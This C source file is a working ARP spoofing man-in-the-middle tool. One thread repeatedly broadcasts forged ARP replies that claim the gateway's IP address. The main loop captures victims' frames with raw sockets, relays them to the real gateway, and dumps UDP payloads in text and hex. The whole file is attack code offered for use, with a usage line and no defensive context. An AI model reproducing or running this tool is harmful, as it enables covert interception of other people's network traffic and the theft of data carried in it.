// This program requires root privilages.
// Usage: ./spoofer INTERFACE GW_HW_ADDR GW_IP_ADDR CLIENT_IP_ADDR IP_MASK

#include <arpa/inet.h>
//#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>
#include <pthread.h>
#include <libnet.h>

void * arp_spoofer(void * param)
{
  libnet_t *ln;
  u_int32_t target_ip_addr, zero_ip_addr;
  u_int8_t bcast_hw_addr[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff},
           zero_hw_addr[6]  = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  struct libnet_ether_addr* src_hw_addr;
  char errbuf[LIBNET_ERRBUF_SIZE];

  ln = libnet_init(LIBNET_LINK, NULL, errbuf);
  src_hw_addr = libnet_get_hwaddr(ln);
  target_ip_addr = libnet_name2addr4(ln, (char *) param, LIBNET_RESOLVE);
  zero_ip_addr = libnet_name2addr4(ln, "0.0.0.0", LIBNET_DONT_RESOLVE);
  libnet_autobuild_arp(
    ARPOP_REPLY,                     /* operation type       */
    src_hw_addr->ether_addr_octet,   /* sender hardware addr */
    (u_int8_t*) &target_ip_addr,     /* sender protocol addr */
    zero_hw_addr,                    /* target hardware addr */
    (u_int8_t*) &zero_ip_addr,       /* target protocol addr */
    ln);                             /* libnet context       */
  libnet_autobuild_ethernet(
    bcast_hw_addr,                   /* ethernet destination */
    ETHERTYPE_ARP,                   /* ethertype            */
    ln);                             /* libnet context       */
  
  while(1)
  {
    libnet_write(ln);
    sleep(5);
  }

  libnet_destroy(ln);
  return EXIT_SUCCESS;

}

int main(int argc, char** argv) {
  pthread_t arp;
  int sfd, gwsfd, ifindex;
  int i;
  ssize_t len, udplen;
  char* frame;
  char* fdata;
  struct ethhdr* fhead;
  struct ifreq ifr;
  struct sockaddr_ll sall, gwall;
  struct in_addr gway, mask, bcast;
  char saddr[16], daddr[16], bcastaddr[16];
  unsigned char hwaddr[6];
  struct udphdr *udp;
  unsigned char * udpdata;
  
  // get broadcast address
  inet_pton(AF_INET, argv[3], &(gway));
  inet_pton(AF_INET, argv[5], &(mask));
  bcast.s_addr = gway.s_addr | (~mask.s_addr);
  inet_ntop(AF_INET, &bcast.s_addr, (char*) &bcastaddr, 16);
  //printf("%s\n", bcastaddr);

  strncpy(ifr.ifr_name, argv[1], IFNAMSIZ);
  // set up relaying socket
  gwsfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  ioctl(gwsfd, SIOCGIFINDEX, &ifr);
  ifindex = ifr.ifr_ifindex;
  ioctl(gwsfd, SIOCGIFHWADDR, &ifr);
  memcpy(hwaddr, &ifr.ifr_hwaddr.sa_data, ETH_ALEN);
  memset(&gwall, 0, sizeof(struct sockaddr_ll));
  gwall.sll_family = AF_PACKET;
  gwall.sll_protocol = htons(ETH_P_IP);
  gwall.sll_ifindex = ifindex;
  gwall.sll_hatype = ARPHRD_ETHER;
  gwall.sll_pkttype = PACKET_OUTGOING;
  gwall.sll_halen = ETH_ALEN;
  sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &gwall.sll_addr[0], &gwall.sll_addr[1], &gwall.sll_addr[2],
         &gwall.sll_addr[3], &gwall.sll_addr[4], &gwall.sll_addr[5]);

  // set up receiving socket
  sfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_IP));
  ioctl(sfd, SIOCGIFINDEX, &ifr);
  memset(&sall, 0, sizeof(struct sockaddr_ll));
  sall.sll_family = AF_PACKET;
  sall.sll_protocol = htons(ETH_P_IP);
  sall.sll_ifindex = ifr.ifr_ifindex;
  sall.sll_hatype = ARPHRD_ETHER;
  sall.sll_pkttype = PACKET_HOST;
  sall.sll_halen = ETH_ALEN;
  bind(sfd, (struct sockaddr*) &sall, sizeof(struct sockaddr_ll));

  // start the arp spoofer
  pthread_create(&arp, NULL, arp_spoofer, argv[3]);

  // start listening
  while(1) {
    frame = malloc(ETH_FRAME_LEN);
    memset(frame, 0, ETH_FRAME_LEN);
    fhead = (struct ethhdr*) frame;
    fdata = frame + ETH_HLEN;
    len = recvfrom(sfd, frame, ETH_FRAME_LEN, 0, NULL, NULL);
    struct iphdr *ip;
    ip = (struct iphdr *)fdata;
    inet_ntop(AF_INET, &ip->saddr, (char*) &saddr, 16);
    inet_ntop(AF_INET, &ip->daddr, (char*) &daddr, 16);

    // ignore packets from original gateway, addresed to the client, or sent to the broadcast address
    if (strcmp(saddr, argv[3]) == 0
      || strcmp(daddr, bcastaddr) == 0
      || strcmp(daddr, argv[4]) == 0)
      continue;

    if (ip->protocol == IPPROTO_UDP)
    {
      //udp = (struct udphdr*)ip + (ip->ihl * 4);
      udpdata = (unsigned char *)ip + (ip->ihl * 4) + sizeof(struct udphdr);
      udplen = len - (ETH_HLEN + (ip->ihl * 4) + sizeof(struct udphdr));

      memcpy(fhead->h_source, hwaddr, ETH_ALEN);

      sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
         &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);

      len = sendto(gwsfd, frame, len, 0,
            (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));

      printf("relaying UDP from %s [%ldB]\n", saddr, len);
      printf("UDP data: %s\n", udpdata);
      for (i = 0; i < len ; i++) {
        printf("%02x ", (unsigned char) frame[i]);
        if ((i + 1) % 16 == 0)
          printf("\n");
      }
      printf("\n\n");
      for (i = 0; i < udplen ; i++) {
        printf("%02x ", (unsigned char) udpdata[i]);
        if ((i + 1) % 16 == 0)
          printf("\n");
      }
      printf("\n\n\n");
    }
    // relay all other packets to gateway
    else
    {
      memcpy(fhead->h_source, hwaddr, ETH_ALEN);

      sscanf(argv[2], "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &fhead->h_dest[0], &fhead->h_dest[1], &fhead->h_dest[2],
         &fhead->h_dest[3], &fhead->h_dest[4], &fhead->h_dest[5]);

      len = sendto(gwsfd, frame, len, 0,
            (struct sockaddr*) &gwall, sizeof(struct sockaddr_ll));

      //printf("relaying TCP from %s [%ldB]\n", saddr, len);
    }
    free(frame);
  }
  close(sfd);
  return EXIT_SUCCESS;
}